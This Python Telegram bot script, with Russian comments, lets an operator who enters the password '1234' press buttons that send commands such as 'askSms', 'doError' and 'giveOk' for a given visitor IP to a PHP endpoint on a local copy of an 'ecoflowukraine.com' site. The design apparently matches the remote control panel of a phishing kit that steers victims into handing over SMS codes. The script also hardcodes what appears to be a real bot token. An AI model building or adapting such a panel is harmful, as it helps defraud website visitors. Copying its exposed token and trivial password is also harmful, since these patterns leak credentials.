import telebot
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
from telebot.types import ReplyKeyboardMarkup, KeyboardButton
from telebot.types import Message
from telebot.types import CallbackQuery
import requests

# doc: 2024.07.12 - Part 3 кнопки которые появляются в чате в меню а так же второй уровень меню и отправка уведомления на сайт

# Вставьте ваш токен здесь
bot = telebot.TeleBot("5835450415:AAG53FqTKV8JX5bIXEsUIh35CBmbRClt9QI")
# WEBHOOK_URL = 'http://localhost/telegram-bot-test/receive.php'  # Замените на URL вашего вебхука
WEBHOOK_URL = 'http://localhost/ecoflowukraine.com/src/scripts/receive2.php' 

loggedIDs = []

# Функция для старта бота и отображения кнопок
@bot.message_handler(commands=['start'])
def start(message: Message):
    if message.chat.id in loggedIDs:
        bot.send_message(message.chat.id, 'Вы уже вошли в систему')
        return
    # main_menu(message)
    bot.send_message(message.chat.id, 'Привет введите пароль')
    
@bot.message_handler(func=lambda message: True)
def handle_message(message):
    chat_id = message.chat.id
    
    if message.text == '1234'  and chat_id not in loggedIDs:
        loggedIDs.append(chat_id)
        bot.send_message(chat_id, 'Вы вошли в систему')
    elif message.text == '1234' and chat_id in loggedIDs:
        bot.send_message(chat_id, 'Вы уже вошли в систему')


@bot.callback_query_handler(func=lambda call: True)
def callback_query(call: CallbackQuery):
    if call.message.chat.id not in loggedIDs:
        bot.answer_callback_query(call.id, "Вы не вошли в систему!")
        # bot.send_message(call.message.chat.id, 'Вы не вошли в систему')
        return
    
    my_ip = [msg for msg in call.message.text.split('\n') if 'IP:' in msg][0].split(' ')[1].strip()

    if call.data == "user_ip_btn":
        bot.answer_callback_query(call.id, "User IP button pressed!")
        bot.send_message(call.message.chat.id, my_ip)

        # handle_button1()
    elif call.data == "give_error":
        bot.answer_callback_query(call.id, "Error message sent!" + my_ip)
        send_notification_to_website('doError', call.message.chat.id, my_ip)

    elif call.data == "give_ok":
        bot.answer_callback_query(call.id, "User approved!" + my_ip)
        send_notification_to_website('giveOk', call.message.chat.id, my_ip)
    
    elif call.data == "ask_popup":
        bot.answer_callback_query(call.id, "Asked for popup! " + my_ip)
        send_notification_to_website('askPopup', call.message.chat.id, my_ip)
        
        # bot.send_message(call.message.chat.id, )

    elif call.data == "ask_sms":
        bot.answer_callback_query(call.id, "Asked for SMS! " + my_ip)
        send_notification_to_website('askSms', call.message.chat.id, my_ip)
        
        # bot.send_message(call.message.chat.id, "Asked for SMS! " + my_ip)


# Функция для отправки уведомления на сайт
def send_notification_to_website(text_to_send, chat_id, user_ip):
    # Предположим, что IP-адрес пользователя доступен как параметр.
    # Здесь мы его хардкодим для примера.
    # user_ip = '192.168.1.1'  # Замените на реальный IP-адрес пользователя
    data = {'ip': user_ip, 'message': text_to_send}
    response = requests.post(WEBHOOK_URL, json=data)
    print(response.text)
    if response.status_code == 200:
        print("Notification sent successfully")
    else:
        print(f"Failed to send notification, status code: {response.status_code}")
    bot.send_message(chat_id, "Response:" + response.text)
    


#* Кнопки в меню (не в чате)
# # Функция для отображения главного меню
# def main_menu(message):
#     markup = telebot.types.ReplyKeyboardMarkup(resize_keyboard=True, one_time_keyboard=False)
#     markup.row_width = 1
#     markup.add(telebot.types.KeyboardButton("Отправить сообщение"))
#     markup.row_width = 2
#     markup.add(telebot.types.KeyboardButton("bb"), telebot.types.KeyboardButton("cc"))
#     markup.row_width = 1
#     markup.add(telebot.types.KeyboardButton("Субменю"))
#     bot.send_message(message.chat.id, "Выберите одну из кнопок:", reply_markup=markup)

#* # Функция для отображения второго уровня меню
# def submenu_aaaa(chat_id):
#     markup = telebot.types.ReplyKeyboardMarkup(resize_keyboard=True, one_time_keyboard=False)
#     markup.row_width = 2
#     markup.add(telebot.types.KeyboardButton("eeee"), telebot.types.KeyboardButton("ffff"))
#     markup.row_width = 1
#     markup.add(telebot.types.KeyboardButton("Назад"))
#     bot.send_message(chat_id, "Вы выбрали aaaa. Выберите одну из кнопок:", reply_markup=markup)



#* Функция для обработки сообщений или нажатия шаблонных кнопок
# # Функция для обработки нажатий кнопок
# @bot.message_handler(func=lambda message: True)
# def handle_message(message):
#     chat_id = message.chat.id
#     if message.text == "Субменю":
#         submenu_aaaa(chat_id)
#     elif message.text == "bb":
#         bot.send_message(chat_id, "Вы нажали: bb")
#     elif message.text == "cc":
#         bot.send_message(chat_id, "Вы нажали: cc")
#     elif message.text == "Отправить сообщение":
#         # bot.send_message(chat_id, "Вы нажали: dddd")
#         # send_notification_to_website(message.text)
#         send_notification_to_website('127.0.0.1', chat_id)
    
#     elif message.text == "eeee":
#         bot.send_message(chat_id, "Вы нажали: eeee")
#     elif message.text == "ffff":
#         bot.send_message(chat_id, "Вы нажали: ffff")
#     elif message.text == "Назад":
#         main_menu(message)
#     else:
#         bot.send_message(chat_id, "Пожалуйста, выберите одну из кнопок.")


# Запуск бота
bot.polling()
